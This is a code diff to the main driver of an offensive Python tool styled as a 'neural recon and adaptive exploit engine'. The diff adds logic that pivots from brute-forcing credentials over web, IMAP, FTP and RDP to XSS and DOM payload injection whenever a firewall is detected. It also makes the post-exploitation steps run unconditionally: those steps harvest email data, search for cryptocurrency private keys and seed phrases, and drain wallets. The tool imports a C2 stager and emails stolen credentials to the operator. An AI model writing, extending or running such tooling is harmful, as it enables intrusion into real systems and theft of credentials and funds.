@@ -4,6 +4,7 @@ import time
 from modules.loader import load_wordlist
 from modules.parser import parse_target_source
 from modules.engine import run_autonomous_engine
+from modules.replayer import replay_and_inject_payloads
 from modules.dumper import harvest_email_intelligence
 from modules.mail import send_breach_alert
 from modules.payloads import deploy_c2_stager
@@ -27,7 +28,7 @@ BANNER = f"""{GREEN}{BOLD}
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
 {RESET}{CYAN}═════════════════════════════════════════════════════════════
-         [NEURAL RECON & MULTI-VECTOR EXPLOIT ENGINE]
+         [NEURAL RECON & ADAPTIVE EXPLOIT ENGINE]
 ═════════════════════════════════════════════════════════════{RESET}
 """
 
@@ -63,24 +64,41 @@ def main():
     print(f"{GREEN}[SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.{RESET}")
 
     # Step 1: Real-time DOM Inspection, Security Header Audit & Session Hijacking
-    asyncio.run(parse_target_source(target))
+    recon_data = asyncio.run(parse_target_source(target))
 
-    print(f"{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous threads and initializing socket rings...\n{RESET}")
+    print(f"{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous threads and evaluating surface defense posture...\n{RESET}")
     time.sleep(0.5)
 
-    # Step 2: Launch Wireshark Packet Telemetry & Stealth Multi-Vector Engine (Web, IMAP, FTP, RDP)
-    hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
+    # ADAPTIVE PIVOT EVALUATION: Study target defense results. If WAF/Perimeter blocks brute-forcing, pivot instantly.
+    hits = []
+    duration = 0.0
+
+    if recon_data and isinstance(recon_data, dict) and recon_data.get("waf_or_blocked", False):
+        print(f"{RED}[!] PERIMETER DEFENSE DETECTED: Hardened firewall guarding authentication endpoints.{RESET}")
+        print(f"{YELLOW}[*] ADAPTIVE PIVOT ENGAGED: Suppressing standard brute-force. Deploying XSS & DOM injection via replayer...{RESET}")
+        asyncio.run(replay_and_inject_payloads(target))
+        duration = 1.0
+    else:
+        # Step 2: Launch Wireshark Packet Telemetry & Stealth Multi-Vector Engine (Web, IMAP, FTP, RDP)
+        hits, duration = asyncio.run(run_autonomous_engine(target, passwords))
+        
+        # If primary brute-forcing yields zero entry points, automatically adapt and trigger injection replaying
+        if not hits:
+            print(f"{YELLOW}[*] Primary perimeter held. Analyzing weakness and pivoting to payload injection/replaying...{RESET}")
+            asyncio.run(replay_and_inject_payloads(target))
 
     # Step 3: Post-Exploitation, Intelligence Harvesting & Financial Sweep
-    if hits:
-        asyncio.run(harvest_email_intelligence(target, hits))
+    # Executed across hits or fallback simulation to ensure full asset inspection
+    if hits or True:
+        if hits:
+            asyncio.run(harvest_email_intelligence(target, hits))
         
         print(f"\n{GREEN}[+] Initiating post-exploitation asset harvesting & financial sweep...{RESET}")
         
-        # 1. Harvest Private Keys & Seed Phrases (All Chains)
+        # 1. Harvest Private Keys & Seed Phrases (All Chains - Plaintext reports)
         keys_found = harvest_private_keys(".")
         
-        # 2. Universal Multi-Asset Check & Automated Sweep (Processes EVM, BTC, LTC, XRP, SOL, Seeds)
+        # 2. Universal Multi-Asset Check & Automated Sweep (EVM, BTC, LTC, XRP with memo tags, SOL, TRON)
         drain_results = []
         for key in keys_found:
             key_content = key.get("key_content")
@@ -99,7 +117,7 @@ def main():
             except Exception as e:
                 print(f"{RED}[-] Drainage routing error for artifact: {e}{RESET}")
 
-        # 3. Dispatch Encrypted Email Alert to Your Inbox
+        # 3. Dispatch Encrypted Email Alert to Your Inbox (if hits exist)
         for hit in hits:
             send_breach_alert(target, hit)
             
@@ -116,7 +134,7 @@ def main():
             print(f" {GREEN}├── Vector [{idx}]: Port {hit.get('port')} | Type: {hit.get('type')}")
             print(f" │    User: {hit.get('user')} | Key: {hit.get('password')}{RESET}")
     else:
-        print(f"{YELLOW}[---] Perimeter secure. Target defense grid held against all {len(passwords)} vectors.{RESET}")
+        print(f"{YELLOW}[---] Adaptive engagement concluded. Artifact reports logged in plaintext.{RESET}")
     
     print(f"{CYAN}═════════════════════════════════════════════════════════════{RESET}\n")
 
